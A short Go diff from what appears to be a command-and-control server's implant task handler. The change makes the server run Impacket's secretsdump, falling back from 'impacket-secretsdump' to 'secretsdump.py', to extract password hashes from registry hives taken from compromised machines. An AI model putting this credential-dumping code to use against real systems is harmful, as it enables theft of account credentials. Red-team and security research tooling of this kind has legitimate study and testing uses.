@@ -338,7 +338,7 @@ func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 			// Dump hashes
 			outFile := "/tmp/secretsdump_output"
 			_, err = meta.ExecCommand(
-				"secretsdump.py", // "impacket-secretsdump" if the impacket installed with apt
+				"impacket-secretsdump",
 				"-sam", samHive,
 				"-security", securityHive,
 				"-system", systemHive,
@@ -346,8 +346,20 @@ func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 				"LOCAL",
 			)
 			if err != nil {
-				ctx.String(http.StatusBadRequest, "")
-				return
+				// If error occured, try 'secretsdump.py' (installed with pip) instead.
+				_, err = meta.ExecCommand(
+					"secretsdump.py",
+					"-sam", samHive,
+					"-security", securityHive,
+					"-system", systemHive,
+					"-outputfile", outFile,
+					"LOCAL",
+				)
+				if err != nil {
+					ctx.String(http.StatusBadRequest, "")
+					return
+				}
+
 			}
 			// Read output
 			resultSam, err := os.ReadFile(outFile + ".sam")
